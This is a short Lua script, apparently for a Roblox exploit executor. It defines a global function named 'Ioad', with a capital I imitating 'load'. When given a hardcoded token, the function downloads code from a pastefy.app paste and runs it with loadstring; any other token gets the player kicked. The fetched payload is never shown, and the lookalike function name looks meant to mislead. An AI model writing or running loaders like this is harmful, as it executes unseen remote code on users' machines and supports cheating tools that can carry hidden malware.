local HttpService = game:GetService("HttpService")
local token = "b80d7e3c7537171e69f28aa0d5b787628"

getgenv().Ioad = function(inputToken)
    if inputToken == token then
        loadstring(game:HttpGet("https://pastefy.app/aQX93jCW/raw"))()
    else
        warn("Unauthorized token!")
        game.Players.LocalPlayer:Kick("Invalid Token.")
    end
end
